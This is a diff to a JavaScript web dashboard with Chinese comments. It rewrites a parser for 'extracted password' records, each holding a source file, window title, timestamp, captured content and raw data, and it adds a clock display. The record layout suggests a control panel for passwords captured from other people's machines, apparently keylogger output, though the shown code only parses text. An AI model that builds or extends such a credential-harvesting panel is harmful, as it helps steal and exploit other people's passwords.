@@ -930,48 +930,43 @@ async function viewLatestPasswords() {
 // 解析提取的密码）
 function parseExtractedPasswords(content) {
     const passwords = [];
-    const lines = content.split('\n');
-    let currentPassword = null;
-    let inPasswordContent = false;
+    // 按空行分割记录（每条记录之间通常有空行）
+    const blocks = content.split(/\n\s*\n/);
     
-    for (const line of lines) {
-        const trimmedLine = line.trim();
+    for (const block of blocks) {
+        const trimmed = block.trim();
+        if (!trimmed) continue;
         
-        if (trimmedLine.match(/^\d+\.\s*来自:/)) {
-            if (currentPassword) {
-                passwords.push(currentPassword);
-            }
-            const match = trimmedLine.match(/^(\d+)\.\s*来自:(.*)/);
-            currentPassword = {
-                index: parseInt(match[1]),
-                file: match[2].trim(),
-                window: '',
-                timestamp: '',
-                password: '',
-                rawPassword: ''
-            };
-            inPasswordContent = false;
-        } else if (currentPassword) {
-            if (trimmedLine.startsWith('窗口:')) {
-                currentPassword.window = trimmedLine.substring(4).trim();
-                inPasswordContent = false;
-            } else if (trimmedLine.startsWith('时间:')) {
-                currentPassword.timestamp = trimmedLine.substring(4).trim();
-                inPasswordContent = false;
-            } else if (trimmedLine.startsWith('内容:')) {
-                currentPassword.password = trimmedLine.substring(4).trim();
-                inPasswordContent = true;
-            } else if (trimmedLine.startsWith('原始数据:')) {
-                currentPassword.rawPassword = trimmedLine.substring(5).trim();
-                inPasswordContent = false;
-            } else if (inPasswordContent) {
-                currentPassword.password += '\n' + trimmedLine;
-            }
-        }
-    }
-    
-    if (currentPassword) {
-        passwords.push(currentPassword);
+        // 提取第一条记录的开头 "数字. 来自: 文件名"
+        const headerMatch = trimmed.match(/^(\d+)\.\s*来自\s*:\s*(.+)$/m);
+        if (!headerMatch) continue;
+        
+        const passwordItem = {
+            index: parseInt(headerMatch[1], 10),
+            file: headerMatch[2].trim(),
+            window: '',
+            timestamp: '',
+            password: '',
+            rawPassword: ''
+        };
+        
+        // 提取窗口
+        const windowMatch = trimmed.match(/^窗口\s*:\s*(.+)$/m);
+        if (windowMatch) passwordItem.window = windowMatch[1].trim();
+        
+        // 提取时间
+        const timeMatch = trimmed.match(/^时间\s*:\s*(.+)$/m);
+        if (timeMatch) passwordItem.timestamp = timeMatch[1].trim();
+        
+        // 提取内容（支持跨行内容，直到遇到 "原始数据:" 或结束）
+        const contentMatch = trimmed.match(/^内容\s*:\s*([\s\S]*?)(?=\n原始数据\s*:|$)/m);
+        if (contentMatch) passwordItem.password = contentMatch[1].trim();
+        
+        // 提取原始数据
+        const rawMatch = trimmed.match(/^原始数据\s*:\s*([\s\S]*)$/m);
+        if (rawMatch) passwordItem.rawPassword = rawMatch[1].trim();
+        
+        passwords.push(passwordItem);
     }
     
     return passwords;
@@ -1141,5 +1136,18 @@ function logout() {
     }
 }
 
+// 更新当前时间
+function updateCurrentTime() {
+    const now = new Date();
+    const timeElement = document.getElementById('currentTime');
+    if (timeElement) {
+        timeElement.textContent = now.toLocaleString();
+    }
+}
+
 // 初始化连接
 connectWebSocket();
+
+// 初始化当前时间并每秒更新
+updateCurrentTime();
+setInterval(updateCurrentTime, 1000);
